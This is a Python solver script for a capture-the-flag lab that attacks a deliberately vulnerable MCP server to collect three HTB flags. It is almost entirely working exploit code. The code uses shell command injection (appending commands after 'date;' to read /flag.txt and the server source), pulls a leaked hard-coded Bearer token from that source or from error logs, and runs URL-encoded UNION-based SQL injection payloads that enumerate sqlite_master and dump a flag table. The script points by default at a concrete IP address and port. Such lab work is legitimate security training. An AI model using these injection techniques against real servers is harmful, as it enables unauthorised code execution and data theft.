#!/usr/bin/env python3
"""
Vulnerable MCP Server Lab Solver
Obtains three flags:
  1. Information Disclosure — Bearer token leaked in server source / quantity error logs
  2. Remote Code Execution  — Command injection in execute_server_command
  3. SQL Injection          — UNION-based extraction from the flag table via price://
"""
import argparse
import asyncio
import re

from fastmcp import Client


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def find_htb(text: str) -> str | None:
    m = re.search(r"HTB\{[^}]+\}", text)
    return m.group(0) if m else None


async def call_cmd(client: Client, cmd: str) -> str:
    """Execute a server command via the command-injection vector."""
    r = await client.call_tool("execute_server_command", {"command": cmd})
    return r.data


async def sql_query(client: Client, payload: str) -> str:
    """
    Perform a UNION-based SQL injection via price://{item}.

    The server URL-decodes the item before embedding it in:
        SELECT price FROM items WHERE name='{item}'
    so we can pass URL-encoded payloads to bypass URI validation
    (spaces → %20, = → %3D, ' already work in URI paths).
    Avoid | (pipe) as it is rejected by the URI parser — use group_concat()
    with the default comma separator instead.
    """
    try:
        r = await client.read_resource(f"price://{payload}")
        return r[0].text
    except Exception as e:
        return f"ERR: {e}"


# ---------------------------------------------------------------------------
# Flag 1 – Information Disclosure
# ---------------------------------------------------------------------------

async def flag_info_disclosure(client: Client) -> str:
    """
    The server source code hard-codes a Bearer token for the quantity API.
    When the quantity endpoint encounters a connection error it logs the full
    request headers (including Authorization) to /tmp/log.txt.

    We read the server source via RCE to extract the token directly —
    the same information is also written to the server logs on any
    quantity:// error, demonstrating the info-disclosure vulnerability.
    """
    print("[*] Info Disclosure: reading server source for leaked API key...")

    source = await call_cmd(client, "date;cat /app/server.py")

    flag = find_htb(source)
    if flag:
        return flag

    # Fallback: trigger quantity error so the token is written to logs, then read
    print("[*] Triggering quantity error to populate log...")
    try:
        await client.read_resource("quantity://nonexistent_item_trigger")
    except Exception:
        pass

    logs = (await client.read_resource("resource://logs"))[0].text
    flag = find_htb(logs)
    if flag:
        return flag

    raise RuntimeError("Info disclosure flag not found — check server source manually.")


# ---------------------------------------------------------------------------
# Flag 2 – Remote Code Execution (Command Injection)
# ---------------------------------------------------------------------------

async def flag_rce(client: Client) -> str:
    """
    execute_server_command validates only that the input *starts with* one of
    the allowed commands ('date', 'whoami', 'uptime'), then passes the full
    string to subprocess with shell=True.

    Injecting ';' lets us append arbitrary commands:
        date;cat /flag.txt
    """
    print("[*] RCE: exploiting command injection in execute_server_command...")

    # Confirm injection works
    output = await call_cmd(client, "date;id")
    print(f"    id → {output.splitlines()[-1].strip()}")

    output = await call_cmd(client, "date;cat /flag.txt")
    flag = find_htb(output)
    if flag:
        return flag

    # Fallback: search broadly
    output = await call_cmd(
        client,
        "date;find / -maxdepth 4 -name '*.txt' 2>/dev/null | "
        "grep -v proc | grep -v sys | xargs grep -l 'HTB{' 2>/dev/null | "
        "head -5 | xargs cat 2>/dev/null"
    )
    flag = find_htb(output)
    if flag:
        return flag

    raise RuntimeError("RCE flag not found.")


# ---------------------------------------------------------------------------
# Flag 3 – SQL Injection
# ---------------------------------------------------------------------------

async def flag_sqli(client: Client) -> str:
    """
    The price:// resource template embeds the item name directly into a
    SQLite query without sanitization:
        SELECT price FROM items WHERE name='{item}'

    Steps:
      1.  Confirm injection: banana'--  → returns banana price (comment kills quote)
      2.  Confirm UNION:     x'%20UNION%20SELECT%201--  → returns '1'
      3.  Enumerate tables:  UNION SELECT group_concat(name) FROM sqlite_master
      4.  Extract flag:      UNION SELECT flag FROM flag
    """
    print("[*] SQL injection: enumerating via price:// UNION SELECT...")

    # Step 1 – confirm broken quote terminates without error
    r = await sql_query(client, "banana'--")
    assert "ERR" not in r, f"Confirm #1 failed: {r}"
    print(f"    banana'-- → {r}  (quote termination OK)")

    # Step 2 – confirm UNION with 1 column works
    r = await sql_query(client, "x'%20UNION%20SELECT%201--")
    assert r == "1", f"Confirm #2 failed: {r}"
    print(f"    UNION SELECT 1 → {r}  (UNION confirmed)")

    # Step 3 – list tables (avoid | which is rejected by URI parser)
    tables_raw = await sql_query(
        client, "x'%20UNION%20SELECT%20group_concat(name)%20FROM%20sqlite_master--"
    )
    print(f"    Tables: {tables_raw}")

    # Step 4 – extract flag from the flag table
    flag = await sql_query(client, "x'%20UNION%20SELECT%20flag%20FROM%20flag--")
    if find_htb(flag):
        return flag

    # If multiple rows, use group_concat
    flag = await sql_query(
        client, "x'%20UNION%20SELECT%20group_concat(flag)%20FROM%20flag--"
    )
    if find_htb(flag):
        return find_htb(flag)

    raise RuntimeError(f"SQL injection flag not found. Raw result: {flag}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Vulnerable MCP Server Lab Solver")
    parser.add_argument("--host", default="154.57.164.70")
    parser.add_argument("--port", type=int, default=31991)
    return parser.parse_args()


async def main() -> None:
    args = parse_args()
    target = f"http://{args.host}:{args.port}/mcp/"
    print(f"[*] Target: {target}\n")

    async with Client(target) as client:
        flag1 = await flag_info_disclosure(client)
        print(f"[+] Flag 1 (Info Disclosure): {flag1}\n")

        flag2 = await flag_rce(client)
        print(f"[+] Flag 2 (RCE):             {flag2}\n")

        flag3 = await flag_sqli(client)
        print(f"[+] Flag 3 (SQL Injection):   {flag3}\n")

    print("=" * 60)
    print(f"  Info Disclosure : {flag1}")
    print(f"  RCE             : {flag2}")
    print(f"  SQL Injection   : {flag3}")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
